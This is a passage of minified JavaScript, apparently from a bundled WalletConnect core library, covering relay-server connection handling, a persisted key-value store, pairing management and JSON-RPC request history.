Tt.EventEmitter),re(this,"provider"),re(this,"messages"),re(this,"subscriber"),re(this,"publisher"),re(this,"name",lD),re(this,"transportExplicitlyClosed",!1),re(this,"initialized",!1),re(this,"connectionAttemptInProgress",!1),re(this,"relayUrl"),re(this,"projectId"),re(this,"packageName"),re(this,"bundleId"),re(this,"hasExperiencedNetworkDisruption",!1),re(this,"pingTimeout"),re(this,"heartBeatTimeout",z.toMiliseconds(z.THIRTY_SECONDS+z.FIVE_SECONDS)),re(this,"reconnectTimeout"),re(this,"connectPromise"),re(this,"reconnectInProgress",!1),re(this,"requestsInFlight",[]),re(this,"connectTimeout",z.toMiliseconds(z.ONE_SECOND*15)),re(this,"request",async r=>{var i,s;this.logger.debug("Publishing Request Payload");const o=r.id||On().toString();await this.toEstablishConnection();try{this.logger.trace({id:o,method:r.method,topic:(i=r.params)==null?void 0:i.topic},"relayer.request - publishing...");const a=`${o}:${((s=r.params)==null?void 0:s.tag)||""}`;this.requestsInFlight.push(a);const c=await this.provider.request(r);return this.requestsInFlight=this.requestsInFlight.filter(l=>l!==a),c}catch(a){throw this.logger.debug(`Failed to Publish Request: ${o}`),a}}),re(this,"resetPingTimeout",()=>{Ps()&&(clearTimeout(this.pingTimeout),this.pingTimeout=setTimeout(()=>{var r,i,s,o;try{this.logger.debug({},"pingTimeout: Connection stalled, terminating..."),(o=(s=(i=(r=this.provider)==null?void 0:r.connection)==null?void 0:i.socket)==null?void 0:s.terminate)==null||o.call(s)}catch(a){this.logger.warn(a,a?.message)}},this.heartBeatTimeout))}),re(this,"onPayloadHandler",r=>{this.onProviderPayload(r),this.resetPingTimeout()}),re(this,"onConnectHandler",()=>{this.logger.warn({},"Relayer connected "),this.startPingTimeout(),this.events.emit(we.connect)}),re(this,"onDisconnectHandler",()=>{this.logger.warn({},"Relayer disconnected "),this.requestsInFlight=[],this.onProviderDisconnect()}),re(this,"onProviderErrorHandler",r=>{this.logger.fatal(`Fatal socket error: ${r.message}`),this.events.emit(we.error,r),this.logger.fatal("Fatal socket error received, closing transport"),this.transportClose()}),re(this,"registerProviderListeners",()=>{this.provider.on(gt.payload,this.onPayloadHandler),this.provider.on(gt.connect,this.onConnectHandler),this.provider.on(gt.disconnect,this.onDisconnectHandler),this.provider.on(gt.error,this.onProviderErrorHandler)}),this.core=e.core,this.logger=Ag({logger:(n=e.logger)!=null?n:cD,name:this.name}),this.messages=new pA(this.logger,e.core),this.subscriber=new $A(this,this.logger),this.publisher=new vA(this,this.logger),this.projectId=e?.projectId,this.relayUrl=e?.relayUrl||kg,Vx()?this.packageName=Hu():Wx()&&(this.bundleId=Hu()),this.provider={}}async init(){this.logger.trace("Initialized"),this.registerEventListeners(),await Promise.all([this.messages.init(),this.subscriber.init()]),this.initialized=!0,this.transportOpen().catch(e=>this.logger.warn(e,e?.message))}get context(){return ot(this.logger)}get connected(){var e,n,r;return((r=(n=(e=this.provider)==null?void 0:e.connection)==null?void 0:n.socket)==null?void 0:r.readyState)===1||!1}get connecting(){var e,n,r;return((r=(n=(e=this.provider)==null?void 0:e.connection)==null?void 0:n.socket)==null?void 0:r.readyState)===0||this.connectPromise!==void 0||!1}async publish(e,n,r){this.isInitialized(),await this.publisher.publish(e,n,r),await this.recordMessageEvent({topic:e,message:n,publishedAt:Date.now(),transportType:he.relay},gs.outbound)}async publishCustom(e){this.isInitialized(),await this.publisher.publishCustom(e)}async subscribe(e,n){var r,i,s;this.isInitialized(),(!(n!=null&&n.transportType)||n?.transportType==="relay")&&await this.toEstablishConnection();const o=typeof((r=n?.internal)==null?void 0:r.throwOnFailedPublish)>"u"?!0:(i=n?.internal)==null?void 0:i.throwOnFailedPublish;let a=((s=this.subscriber.topicMap.get(e))==null?void 0:s[0])||"",c;const l=u=>{u.topic===e&&(this.subscriber.off(lt.created,l),c())};return await Promise.all([new Promise(u=>{c=u,this.subscriber.on(lt.created,l)}),new Promise(async(u,h)=>{a=await this.subscriber.subscribe(e,af({internal:{throwOnFailedPublish:o}},n)).catch(f=>{o&&h(f)})||a,u()})]),a}async unsubscribe(e,n){this.isInitialized(),await this.subscriber.unsubscribe(e,n)}on(e,n){this.events.on(e,n)}once(e,n){this.events.once(e,n)}off(e,n){this.events.off(e,n)}removeListener(e,n){this.events.removeListener(e,n)}async transportDisconnect(){this.provider.disconnect&&(this.hasExperiencedNetworkDisruption||this.connected)?await zt(this.provider.disconnect(),2e3,"provider.disconnect()").catch(()=>this.onProviderDisconnect()):this.onProviderDisconnect()}async transportClose(){this.transportExplicitlyClosed=!0,await this.transportDisconnect()}async transportOpen(e){if(!this.subscriber.hasAnyTopics){this.logger.info("Starting WS connection skipped because the client has no topics to work with.");return}if(this.connectPromise?(this.logger.debug({},"Waiting for existing connection attempt to resolve..."),await this.connectPromise,this.logger.debug({},"Existing connection attempt resolved")):(this.connectPromise=new Promise(async(n,r)=>{await this.connect(e).then(n).catch(r).finally(()=>{this.connectPromise=void 0})}),await this.connectPromise),!this.connected)throw new Error(`Couldn't establish socket connection to the relay server: ${this.relayUrl}`)}async restartTransport(e){this.logger.debug({},"Restarting transport..."),!this.connectionAttemptInProgress&&(this.relayUrl=e||this.relayUrl,await this.confirmOnlineStateOrThrow(),await this.transportClose(),await this.transportOpen())}async confirmOnlineStateOrThrow(){if(!await Lh())throw new Error("No internet connection detected. Please restart your network and try again.")}async handleBatchMessageEvents(e){if(e?.length===0){this.logger.trace("Batch message events is empty. Ignoring...");return}const n=e.sort((r,i)=>r.publishedAt-i.publishedAt);this.logger.debug(`Batch of ${n.length} message events sorted`);for(const r of n)try{await this.onMessageEvent(r)}catch(i){this.logger.warn(i,"Error while processing batch message event: "+i?.message)}this.logger.trace(`Batch of ${n.length} message events processed`)}async onLinkMessageEvent(e,n){const{topic:r}=e;if(!n.sessionExists){const i=Ee(z.FIVE_MINUTES),s={topic:r,expiry:i,relay:{protocol:"irn"},active:!1};await this.core.pairing.pairings.set(r,s)}this.events.emit(we.message,e),await this.recordMessageEvent(e,gs.inbound)}async connect(e){await this.confirmOnlineStateOrThrow(),e&&e!==this.relayUrl&&(this.relayUrl=e,await this.transportDisconnect()),this.connectionAttemptInProgress=!0,this.transportExplicitlyClosed=!1;let n=1;for(;n<6;){try{if(this.transportExplicitlyClosed)break;this.logger.debug({},`Connecting to ${this.relayUrl}, attempt: ${n}...`),await this.createProvider(),await new Promise(async(r,i)=>{const s=()=>{i(new Error("Connection interrupted while trying to connect"))};this.provider.once(gt.disconnect,s),await zt(new Promise((o,a)=>{this.provider.connect().then(o).catch(a)}),this.connectTimeout,`Socket stalled when trying to connect to ${this.relayUrl}`).catch(o=>{i(o)}).finally(()=>{this.provider.off(gt.disconnect,s),clearTimeout(this.reconnectTimeout)}),await new Promise(async(o,a)=>{const c=()=>{i(new Error("Connection interrupted while trying to subscribe"))};this.provider.once(gt.disconnect,c),await this.subscriber.start().then(o).catch(a).finally(()=>{this.provider.off(gt.disconnect,c)})}),this.hasExperiencedNetworkDisruption=!1,r()})}catch(r){await this.subscriber.stop();const i=r;this.logger.warn({},i.message),this.hasExperiencedNetworkDisruption=!0}finally{this.connectionAttemptInProgress=!1}if(this.connected){this.logger.debug({},`Connected to ${this.relayUrl} successfully on attempt: ${n}`);break}await new Promise(r=>setTimeout(r,z.toMiliseconds(n*1))),n++}}startPingTimeout(){var e,n,r,i,s;if(Ps())try{(n=(e=this.provider)==null?void 0:e.connection)!=null&&n.socket&&((s=(i=(r=this.provider)==null?void 0:r.connection)==null?void 0:i.socket)==null||s.on("ping",()=>{this.resetPingTimeout()})),this.resetPingTimeout()}catch(o){this.logger.warn(o,o?.message)}}async createProvider(){this.provider.connection&&this.unregisterProviderListeners();const e=await this.core.crypto.signJWT(this.relayUrl);this.provider=new KS(new ZS(Zx({sdkVersion:nc,protocol:this.protocol,version:this.version,relayUrl:this.relayUrl,projectId:this.projectId,auth:e,useOnCloseEvent:!0,bundleId:this.bundleId,packageName:this.packageName}))),this.registerProviderListeners()}async recordMessageEvent(e,n){const{topic:r,message:i}=e;await this.messages.set(r,i,n)}async shouldIgnoreMessageEvent(e){const{topic:n,message:r}=e;if(!r||r.length===0)return this.logger.warn(`Ignoring invalid/empty message: ${r}`),!0;if(!await this.subscriber.isKnownTopic(n))return this.logger.warn(`Ignoring message for unknown topic ${n}`),!0;const i=this.messages.has(n,r);return i&&this.logger.warn(`Ignoring duplicate message: ${r}`),i}async onProviderPayload(e){if(this.logger.debug("Incoming Relay Payload"),this.logger.trace({type:"payload",direction:"incoming",payload:e}),el(e)){if(!e.method.endsWith(uD))return;const n=e.params,{topic:r,message:i,publishedAt:s,attestation:o}=n.data,a={topic:r,message:i,publishedAt:s,transportType:he.relay,attestation:o};this.logger.debug("Emitting Relayer Payload"),this.logger.trace(af({type:"event",event:n.id},a)),this.events.emit(n.id,a),await this.acknowledgePayload(e),await this.onMessageEvent(a)}else oo(e)&&this.events.emit(we.message_ack,e)}async onMessageEvent(e){await this.shouldIgnoreMessageEvent(e)||(await this.recordMessageEvent(e,gs.inbound),this.events.emit(we.message,e))}async acknowledgePayload(e){const n=Ls(e.id,!0);await this.provider.connection.send(n)}unregisterProviderListeners(){this.provider.off(gt.payload,this.onPayloadHandler),this.provider.off(gt.connect,this.onConnectHandler),this.provider.off(gt.disconnect,this.onDisconnectHandler),this.provider.off(gt.error,this.onProviderErrorHandler),clearTimeout(this.pingTimeout)}async registerEventListeners(){let e=await Lh();H8(async n=>{e!==n&&(e=n,n?await this.transportOpen().catch(r=>this.logger.error(r,r?.message)):(this.hasExperiencedNetworkDisruption=!0,await this.transportDisconnect(),this.transportExplicitlyClosed=!1))}),this.core.heartbeat.on(cr.pulse,async()=>{if(!this.transportExplicitlyClosed&&!this.connected&&Z8())try{await this.confirmOnlineStateOrThrow(),await this.transportOpen()}catch(n){this.logger.warn(n,n?.message)}})}async onProviderDisconnect(){clearTimeout(this.pingTimeout),this.events.emit(we.disconnect),this.connectionAttemptInProgress=!1,!this.reconnectInProgress&&(this.reconnectInProgress=!0,await this.subscriber.stop(),this.subscriber.hasAnyTopics&&(this.transportExplicitlyClosed||(this.reconnectTimeout=setTimeout(async()=>{await this.transportOpen().catch(e=>this.logger.error(e,e?.message)),this.reconnectTimeout=void 0,this.reconnectInProgress=!1},z.toMiliseconds(hD)))))}isInitialized(){if(!this.initialized){const{message:e}=V("NOT_INITIALIZED",this.name);throw new Error(e)}}async toEstablishConnection(){if(await this.confirmOnlineStateOrThrow(),!this.connected){if(this.connectPromise){await this.connectPromise;return}await this.connect()}}}function RA(t,e){return t===e||Number.isNaN(t)&&Number.isNaN(e)}function cf(t){return Object.getOwnPropertySymbols(t).filter(e=>Object.prototype.propertyIsEnumerable.call(t,e))}function lf(t){return t==null?t===void 0?"[object Undefined]":"[object Null]":Object.prototype.toString.call(t)}const kA="[object RegExp]",NA="[object String]",UA="[object Number]",MA="[object Boolean]",uf="[object Arguments]",LA="[object Symbol]",FA="[object Date]",jA="[object Map]",qA="[object Set]",zA="[object Array]",VA="[object Function]",WA="[object ArrayBuffer]",ua="[object Object]",KA="[object Error]",HA="[object DataView]",GA="[object Uint8Array]",YA="[object Uint8ClampedArray]",ZA="[object Uint16Array]",XA="[object Uint32Array]",JA="[object BigUint64Array]",QA="[object Int8Array]",eO="[object Int16Array]",tO="[object Int32Array]",nO="[object BigInt64Array]",rO="[object Float32Array]",iO="[object Float64Array]";function sO(){}function hf(t){if(!t||typeof t!="object")return!1;const e=Object.getPrototypeOf(t);return e===null||e===Object.prototype||Object.getPrototypeOf(e)===null?Object.prototype.toString.call(t)==="[object Object]":!1}function oO(t,e,n){return hi(t,e,void 0,void 0,void 0,void 0,n)}function hi(t,e,n,r,i,s,o){const a=o(t,e,n,r,i,s);if(a!==void 0)return a;if(typeof t==typeof e)switch(typeof t){case"bigint":case"string":case"boolean":case"symbol":case"undefined":return t===e;case"number":return t===e||Object.is(t,e);case"function":return t===e;case"object":return wi(t,e,s,o)}return wi(t,e,s,o)}function wi(t,e,n,r){if(Object.is(t,e))return!0;let i=lf(t),s=lf(e);if(i===uf&&(i=ua),s===uf&&(s=ua),i!==s)return!1;switch(i){case NA:return t.toString()===e.toString();case UA:{const c=t.valueOf(),l=e.valueOf();return RA(c,l)}case MA:case FA:case LA:return Object.is(t.valueOf(),e.valueOf());case kA:return t.source===e.source&&t.flags===e.flags;case VA:return t===e}n=n??new Map;const o=n.get(t),a=n.get(e);if(o!=null&&a!=null)return o===e;n.set(t,e),n.set(e,t);try{switch(i){case jA:{if(t.size!==e.size)return!1;for(const[c,l]of t.entries())if(!e.has(c)||!hi(l,e.get(c),c,t,e,n,r))return!1;return!0}case qA:{if(t.size!==e.size)return!1;const c=Array.from(t.values()),l=Array.from(e.values());for(let u=0;u<c.length;u++){const h=c[u],f=l.findIndex(p=>hi(h,p,void 0,t,e,n,r));if(f===-1)return!1;l.splice(f,1)}return!0}case zA:case GA:case YA:case ZA:case XA:case JA:case QA:case eO:case tO:case nO:case rO:case iO:{if(typeof Buffer<"u"&&Buffer.isBuffer(t)!==Buffer.isBuffer(e)||t.length!==e.length)return!1;for(let c=0;c<t.length;c++)if(!hi(t[c],e[c],c,t,e,n,r))return!1;return!0}case WA:return t.byteLength!==e.byteLength?!1:wi(new Uint8Array(t),new Uint8Array(e),n,r);case HA:return t.byteLength!==e.byteLength||t.byteOffset!==e.byteOffset?!1:wi(new Uint8Array(t),new Uint8Array(e),n,r);case KA:return t.name===e.name&&t.message===e.message;case ua:{if(!(wi(t.constructor,e.constructor,n,r)||hf(t)&&hf(e)))return!1;const c=[...Object.keys(t),...cf(t)],l=[...Object.keys(e),...cf(e)];if(c.length!==l.length)return!1;for(let u=0;u<c.length;u++){const h=c[u],f=t[h];if(!Object.hasOwn(e,h))return!1;const p=e[h];if(!hi(f,p,h,t,e,n,r))return!1}return!0}default:return!1}}finally{n.delete(t),n.delete(e)}}function aO(t,e){return oO(t,e,sO)}var cO=Object.defineProperty,ff=Object.getOwnPropertySymbols,lO=Object.prototype.hasOwnProperty,uO=Object.prototype.propertyIsEnumerable,lc=(t,e,n)=>e in t?cO(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,df=(t,e)=>{for(var n in e||(e={}))lO.call(e,n)&&lc(t,n,e[n]);if(ff)for(var n of ff(e))uO.call(e,n)&&lc(t,n,e[n]);return t},Xe=(t,e,n)=>lc(t,typeof e!="symbol"?e+"":e,n);class hr extends Am{constructor(e,n,r,i=Vt,s=void 0){super(e,n,r,i),this.core=e,this.logger=n,this.name=r,Xe(this,"map",new Map),Xe(this,"version",fD),Xe(this,"cached",[]),Xe(this,"initialized",!1),Xe(this,"getKey"),Xe(this,"storagePrefix",Vt),Xe(this,"recentlyDeleted",[]),Xe(this,"recentlyDeletedLimit",200),Xe(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(o=>{this.getKey&&o!==null&&!$e(o)?this.map.set(this.getKey(o),o):I8(o)?this.map.set(o.id,o):S8(o)&&this.map.set(o.topic,o)}),this.cached=[],this.initialized=!0)}),Xe(this,"set",async(o,a)=>{this.isInitialized(),this.map.has(o)?await this.update(o,a):(this.logger.debug("Setting value"),this.logger.trace({type:"method",method:"set",key:o,value:a}),this.map.set(o,a),await this.persist())}),Xe(this,"get",o=>(this.isInitialized(),this.logger.debug("Getting value"),this.logger.trace({type:"method",method:"get",key:o}),this.getData(o))),Xe(this,"getAll",o=>(this.isInitialized(),o?this.values.filter(a=>Object.keys(o).every(c=>aO(a[c],o[c]))):this.values)),Xe(this,"update",async(o,a)=>{this.isInitialized(),this.logger.debug("Updating value"),this.logger.trace({type:"method",method:"update",key:o,update:a});const c=df(df({},this.getData(o)),a);this.map.set(o,c),await this.persist()}),Xe(this,"delete",async(o,a)=>{this.isInitialized(),this.map.has(o)&&(this.logger.debug("Deleting value"),this.logger.trace({type:"method",method:"delete",key:o,reason:a}),this.map.delete(o),this.addToRecentlyDeleted(o),await this.persist())}),this.logger=dt(n,this.name),this.storagePrefix=i,this.getKey=s}get context(){return ot(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.map.size}get keys(){return Array.from(this.map.keys())}get values(){return Array.from(this.map.values())}addToRecentlyDeleted(e){this.recentlyDeleted.push(e),this.recentlyDeleted.length>=this.recentlyDeletedLimit&&this.recentlyDeleted.splice(0,this.recentlyDeletedLimit/2)}async setDataStore(e){await this.core.storage.setItem(this.storageKey,e)}async getDataStore(){return await this.core.storage.getItem(this.storageKey)}getData(e){const n=this.map.get(e);if(!n){if(this.recentlyDeleted.includes(e)){const{message:i}=V("MISSING_OR_INVALID",`Record was recently deleted - ${this.name}: ${e}`);throw this.logger.error(i),new Error(i)}const{message:r}=V("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.error(r),new Error(r)}return n}async persist(){await this.setDataStore(this.values)}async restore(){try{const e=await this.getDataStore();if(typeof e>"u"||!e.length)return;if(this.map.size){const{message:n}=V("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(n),new Error(n)}this.cached=e,this.logger.debug(`Successfully Restored value for ${this.name}`),this.logger.trace({type:"method",method:"restore",value:this.values})}catch(e){this.logger.debug(`Failed to Restore value for ${this.name}`),this.logger.error(e)}}isInitialized(){if(!this.initialized){const{message:e}=V("NOT_INITIALIZED",this.name);throw new Error(e)}}}var hO=Object.defineProperty,fO=(t,e,n)=>e in t?hO(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,J=(t,e,n)=>fO(t,typeof e!="symbol"?e+"":e,n);class dO{constructor(e,n){this.core=e,this.logger=n,J(this,"name",yD),J(this,"version",mD),J(this,"events",new qf),J(this,"pairings"),J(this,"initialized",!1),J(this,"storagePrefix",Vt),J(this,"ignoredPayloadTypes",[an]),J(this,"registeredMethods",[]),J(this,"init",async()=>{this.initialized||(await this.pairings.init(),await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.initialized=!0,this.logger.trace("Initialized"))}),J(this,"register",({methods:r})=>{this.isInitialized(),this.registeredMethods=[...new Set([...this.registeredMethods,...r])]}),J(this,"create",async r=>{this.isInitialized();const i=Za(),s=await this.core.crypto.setSymKey(i),o=Ee(z.FIVE_MINUTES),a={protocol:Rg},c={topic:s,expiry:o,relay:a,active:!1,methods:r?.methods},l=Ch({protocol:this.core.protocol,version:this.core.version,topic:s,symKey:i,relay:a,expiryTimestamp:o,methods:r?.methods});return this.events.emit(Kn.create,c),this.core.expirer.set(s,o),await this.pairings.set(s,c),await this.core.relayer.subscribe(s,{transportType:r?.transportType,internal:r?.internal}),{topic:s,uri:l}}),J(this,"pair",async r=>{this.isInitialized();const i=this.core.eventClient.createEvent({properties:{topic:r?.uri,trace:[Ft.pairing_started]}});this.isValidPair(r,i);const{topic:s,symKey:o,relay:a,expiryTimestamp:c,methods:l}=$h(r.uri);i.props.properties.topic=s,i.addTrace(Ft.pairing_uri_validation_success),i.addTrace(Ft.pairing_uri_not_expired);let u;if(this.pairings.keys.includes(s)){if(u=this.pairings.get(s),i.addTrace(Ft.existing_pairing),u.active)throw i.setError(Qt.active_pairing_already_exists),new Error(`Pairing already exists: ${s}. Please try again with a new connection URI.`);i.addTrace(Ft.pairing_not_expired)}const h=c||Ee(z.FIVE_MINUTES),f={topic:s,relay:a,expiry:h,active:!1,methods:l};this.core.expirer.set(s,h),await this.pairings.set(s,f),i.addTrace(Ft.store_new_pairing),r.activatePairing&&await this.activate({topic:s}),this.events.emit(Kn.create,f),i.addTrace(Ft.emit_inactive_pairing),this.core.crypto.keychain.has(s)||await this.core.crypto.setSymKey(o,s),i.addTrace(Ft.subscribing_pairing_topic);try{await this.core.relayer.confirmOnlineStateOrThrow()}catch{i.setError(Qt.no_internet_connection)}try{await this.core.relayer.subscribe(s,{relay:a})}catch(p){throw i.setError(Qt.subscribe_pairing_topic_failure),p}return i.addTrace(Ft.subscribe_pairing_topic_success),f}),J(this,"activate",async({topic:r})=>{this.isInitialized();const i=Ee(z.FIVE_MINUTES);this.core.expirer.set(r,i),await this.pairings.update(r,{active:!0,expiry:i})}),J(this,"ping",async r=>{this.isInitialized(),await this.isValidPing(r),this.logger.warn("ping() is deprecated and will be removed in the next major release.");const{topic:i}=r;if(this.pairings.keys.includes(i)){const s=await this.sendRequest(i,"wc_pairingPing",{}),{done:o,resolve:a,reject:c}=Vn();this.events.once(oe("pairing_ping",s),({error:l})=>{l?c(l):a()}),await o()}}),J(this,"updateExpiry",async({topic:r,expiry:i})=>{this.isInitialized(),await this.pairings.update(r,{expiry:i})}),J(this,"updateMetadata",async({topic:r,metadata:i})=>{this.isInitialized(),await this.pairings.update(r,{peerMetadata:i})}),J(this,"getPairings",()=>(this.isInitialized(),this.pairings.values)),J(this,"disconnect",async r=>{this.isInitialized(),await this.isValidDisconnect(r);const{topic:i}=r;this.pairings.keys.includes(i)&&(await this.sendRequest(i,"wc_pairingDelete",de("USER_DISCONNECTED")),await this.deletePairing(i))}),J(this,"formatUriFromPairing",r=>{this.isInitialized();const{topic:i,relay:s,expiry:o,methods:a}=r,c=this.core.crypto.keychain.get(i);return Ch({protocol:this.core.protocol,version:this.core.version,topic:i,symKey:c,relay:s,expiryTimestamp:o,methods:a})}),J(this,"sendRequest",async(r,i,s)=>{const o=rn(i,s),a=await this.core.crypto.encode(r,o),c=ni[i].req;return this.core.history.set(r,o),this.core.relayer.publish(r,a,c),o.id}),J(this,"sendResult",async(r,i,s)=>{const o=Ls(r,s),a=await this.core.crypto.encode(i,o),c=(await this.core.history.get(i,r)).request.method,l=ni[c].res;await this.core.relayer.publish(i,a,l),await this.core.history.resolve(o)}),J(this,"sendError",async(r,i,s)=>{const o=Qc(r,s),a=await this.core.crypto.encode(i,o),c=(await this.core.history.get(i,r)).request.method,l=ni[c]?ni[c].res:ni.unregistered_method.res;await this.core.relayer.publish(i,a,l),await this.core.history.resolve(o)}),J(this,"deletePairing",async(r,i)=>{await this.core.relayer.unsubscribe(r),await Promise.all([this.pairings.delete(r,de("USER_DISCONNECTED")),this.core.crypto.deleteSymKey(r),i?Promise.resolve():this.core.expirer.del(r)])}),J(this,"cleanup",async()=>{const r=this.pairings.getAll().filter(i=>vn(i.expiry));await Promise.all(r.map(i=>this.deletePairing(i.topic)))}),J(this,"onRelayEventRequest",async r=>{const{topic:i,payload:s}=r;switch(s.method){case"wc_pairingPing":return await this.onPairingPingRequest(i,s);case"wc_pairingDelete":return await this.onPairingDeleteRequest(i,s);default:return await this.onUnknownRpcMethodRequest(i,s)}}),J(this,"onRelayEventResponse",async r=>{const{topic:i,payload:s}=r,o=(await this.core.history.get(i,s.id)).request.method;switch(o){case"wc_pairingPing":return this.onPairingPingResponse(i,s);default:return this.onUnknownRpcMethodResponse(o)}}),J(this,"onPairingPingRequest",async(r,i)=>{const{id:s}=i;try{this.isValidPing({topic:r}),await this.sendResult(s,r,!0),this.events.emit(Kn.ping,{id:s,topic:r})}catch(o){await this.sendError(s,r,o),this.logger.error(o)}}),J(this,"onPairingPingResponse",(r,i)=>{const{id:s}=i;setTimeout(()=>{qt(i)?this.events.emit(oe("pairing_ping",s),{}):vt(i)&&this.events.emit(oe("pairing_ping",s),{error:i.error})},500)}),J(this,"onPairingDeleteRequest",async(r,i)=>{const{id:s}=i;try{this.isValidDisconnect({topic:r}),await this.deletePairing(r),this.events.emit(Kn.delete,{id:s,topic:r})}catch(o){await this.sendError(s,r,o),this.logger.error(o)}}),J(this,"onUnknownRpcMethodRequest",async(r,i)=>{const{id:s,method:o}=i;try{if(this.registeredMethods.includes(o))return;const a=de("WC_METHOD_UNSUPPORTED",o);await this.sendError(s,r,a),this.logger.error(a)}catch(a){await this.sendError(s,r,a),this.logger.error(a)}}),J(this,"onUnknownRpcMethodResponse",r=>{this.registeredMethods.includes(r)||this.logger.error(de("WC_METHOD_UNSUPPORTED",r))}),J(this,"isValidPair",(r,i)=>{var s;if(!Qe(r)){const{message:a}=V("MISSING_OR_INVALID",`pair() params: ${r}`);throw i.setError(Qt.malformed_pairing_uri),new Error(a)}if(!_8(r.uri)){const{message:a}=V("MISSING_OR_INVALID",`pair() uri: ${r.uri}`);throw i.setError(Qt.malformed_pairing_uri),new Error(a)}const o=$h(r?.uri);if(!((s=o?.relay)!=null&&s.protocol)){const{message:a}=V("MISSING_OR_INVALID","pair() uri#relay-protocol");throw i.setError(Qt.malformed_pairing_uri),new Error(a)}if(!(o!=null&&o.symKey)){const{message:a}=V("MISSING_OR_INVALID","pair() uri#symKey");throw i.setError(Qt.malformed_pairing_uri),new Error(a)}if(o!=null&&o.expiryTimestamp&&z.toMiliseconds(o?.expiryTimestamp)<Date.now()){i.setError(Qt.pairing_expired);const{message:a}=V("EXPIRED","pair() URI has expired. Please try again with a new connection URI.");throw new Error(a)}}),J(this,"isValidPing",async r=>{if(!Qe(r)){const{message:s}=V("MISSING_OR_INVALID",`ping() params: ${r}`);throw new Error(s)}const{topic:i}=r;await this.isValidPairingTopic(i)}),J(this,"isValidDisconnect",async r=>{if(!Qe(r)){const{message:s}=V("MISSING_OR_INVALID",`disconnect() params: ${r}`);throw new Error(s)}const{topic:i}=r;await this.isValidPairingTopic(i)}),J(this,"isValidPairingTopic",async r=>{if(!be(r,!1)){const{message:i}=V("MISSING_OR_INVALID",`pairing topic should be a string: ${r}`);throw new Error(i)}if(!this.pairings.keys.includes(r)){const{message:i}=V("NO_MATCHING_KEY",`pairing topic doesn't exist: ${r}`);throw new Error(i)}if(vn(this.pairings.get(r).expiry)){await this.deletePairing(r);const{message:i}=V("EXPIRED",`pairing topic: ${r}`);throw new Error(i)}}),this.core=e,this.logger=dt(n,this.name),this.pairings=new hr(this.core,this.logger,this.name,this.storagePrefix)}get context(){return ot(this.logger)}isInitialized(){if(!this.initialized){const{message:e}=V("NOT_INITIALIZED",this.name);throw new Error(e)}}registerRelayerEvents(){this.core.relayer.on(we.message,async e=>{const{topic:n,message:r,transportType:i}=e;if(this.pairings.keys.includes(n)&&i!==he.link_mode&&!this.ignoredPayloadTypes.includes(this.core.crypto.getPayloadType(r)))try{const s=await this.core.crypto.decode(n,r);el(s)?(this.core.history.set(n,s),await this.onRelayEventRequest({topic:n,payload:s})):oo(s)&&(await this.core.history.resolve(s),await this.onRelayEventResponse({topic:n,payload:s}),this.core.history.delete(n,s.id)),await this.core.relayer.messages.ack(n,r)}catch(s){this.logger.error(s)}})}registerExpirerEvents(){this.core.expirer.on(mt.expired,async e=>{const{topic:n}=Ip(e.target);n&&this.pairings.keys.includes(n)&&(await this.deletePairing(n,!0),this.events.emit(Kn.expire,{topic:n}))})}}var pO=Object.defineProperty,gO=(t,e,n)=>e in t?pO(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Te=(t,e,n)=>gO(t,typeof e!="symbol"?e+"":e,n);class yO extends _m{constructor(e,n){super(e,n),this.core=e,this.logger=n,Te(this,"records",new Map),Te(this,"events",new Tt.EventEmitter),Te(this,"name",wD),Te(this,"version",bD),Te(this,"cached",[]),Te(this,"initialized",!1),Te(this,"storagePrefix",Vt),Te(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(r=>this.records.set(r.id,r)),this.cached=[],this.registerEventListeners(),this.initialized=!0)}),Te(this,"set",(r,i,s)=>{if(this.isInitialized(),this.logger.debug("Setting JSON-RPC request history record"),this.logger.trace({type:"method",method:"set",topic:r,request:i,chainId:s}),this.records.has(i.id))return;const o={id:i.id,topic:r,request:{method:i.method,params:i.params||null},chainId:s,expiry:Ee(z.THIRTY_DAYS)};this.records.set(o.id,o),this.persist(),this.events.emit(St.created,o)}),Te(this,"resolve",async r=>{if(this.isInitialized(),this.logger.debug("Updating JSON-RPC response history record"),this.logger.trace({type:"method",method:"update",response:r}),!this.records.has(r.id))return;const i=await this.getRecord(r.id);typeof i.response>"u"&&(i.response=vt(r)?{error:r.error}:{result:r.result},this.records.set(i.id,i),this.persist(),this.events.emit(St.updated,i))}),Te(this,"get",async(r,i)=>(this.isInitialized(),this.logger.debug("Getting record"),this.logger.trace({type:"method",method:"get",topic:r,id:i}),await this.getRecord(i))),Te(this,"delete",(r,i)=>{this.isInitialized(),this.logger.debug("Deleting record"),this.logger.trace({type:"method",method:"delete",id:i}),this.values.forEach(s=>{if(s.topic===r){if(typeof i<"u"&&s.id!==i)return;this.records.delete(s.id),this.events.emit(St.deleted,s)}}),this.persist()}),Te(this,"exists",async(r,i)=>(this.isInitialized(),this.records.has(i)?(await this.getRecord(i)).topic===r:!1)),Te(this,"on",(r,i)=>{this.events.on(r,i)}),Te(this,"once",(r,i)=>{this.events.once(r,i)}),Te(this,"off",(r,i)=>{this.events.off(r,i)}),Te(this,"removeListener",(r,i)=>{this.events.removeListener(r,i)}),this.logger=dt(n,this.name)}get context(){return ot(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get size(){return this.records.size}get keys(){return Array.from(this.records.keys())}get values(){return Array.from(this.records.values())}get pending(){const e=[];return this.values.forEach(n=>{if(typeof n.response<"u")return;const r={topic:n.topic,request:rn(n.request.method,n.request.params,n.id),chainId:n.chainId};return e.push(r)}),e}async setJsonRpcRecords(e){await this.core.storage.setItem(this.storageKey,e)}async getJsonRpcRecords(){return await this.core.storage.getItem(this.storageKey)}getRecord(e){this.isInitialized();const n=this.records.get(e);if(!n){const{message:r}=V("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(r)}return n}async persist(){await this.setJsonRpcRecords(this.values),this.events.emit(St.sync)}async restore(){try{const e=await this.getJsonRpcRecords();if(typeof 